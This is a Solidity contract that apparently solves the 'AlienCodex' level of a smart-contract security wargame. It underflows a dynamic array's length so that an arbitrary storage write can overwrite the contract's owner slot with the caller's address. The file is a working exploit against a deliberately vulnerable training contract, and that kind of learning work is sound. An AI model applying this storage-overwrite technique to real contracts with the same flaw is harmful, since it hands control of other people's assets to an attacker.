// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.0;

import "../levels/19-AlienCodex.sol";

contract AlienCodexAttacker {
    AlienCodex alienCodex = AlienCodex(0xA73E1270601463857B655cf29bCaEC51690DB138);

    function exploit () external {
        // Make contact
        alienCodex.makeContact();

        // Make length of `codex` to be 2^256
        alienCodex.retract();

        // Overwrite _owner
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 content = bytes32(uint256(uint160(tx.origin)));
        alienCodex.revise(index, content);

        require(alienCodex.owner() == tx.origin);
    }
} 